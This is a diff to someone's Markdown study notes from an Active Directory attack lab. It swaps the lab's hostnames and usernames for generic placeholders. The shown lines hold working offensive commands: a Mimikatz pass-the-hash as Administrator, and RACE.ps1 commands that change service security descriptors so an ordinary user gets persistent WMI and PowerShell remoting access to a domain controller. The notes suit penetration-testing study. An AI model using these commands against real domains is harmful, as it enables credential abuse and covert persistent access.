@@ -102,7 +102,6 @@ Invoke-Mimi -Command '"sekurlsa::pth /domain:<MACCHINA> /user:Administrator /ntl
 ls \\<MACCHINA>\c$
 ```
 
-
 ### **Grant remote access to a stupid user**
 Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.
 Open a session with invoke-mimi or rubeus and launch invishell.
@@ -117,7 +116,7 @@ Set-RemoteWMI -SamAccountName student115 -ComputerName dcorp-dc -namespace 'root
 ![[Pasted image 20231025144401.png]]
 Now we granted the acces to us
 ```powershell
-gwmi -class win32_operatingsystem -ComputerName dcorp-dc
+gwmi -class win32_operatingsystem -ComputerName <MACCHINA>
 ```
 ![[Pasted image 20231025144606.png]]
 ___
@@ -126,10 +125,10 @@ We can do the same but with powershell. After opened the session and imported
 . C:\AD\Tools\RACE.ps1
 ```
 ```powershell
-Set-RemotePSRemoting -SamAccountName student115 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+Set-RemotePSRemoting -SamAccountName <STUPID USER> -ComputerName <MACCHINA> -Verbose
 ```
 To check if the command worked
 ```powershell
-Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Command -ScriptBlock{whoami} -ComputerName <MACCHINA>
 ```
 ![[Pasted image 20231025145545.png]]
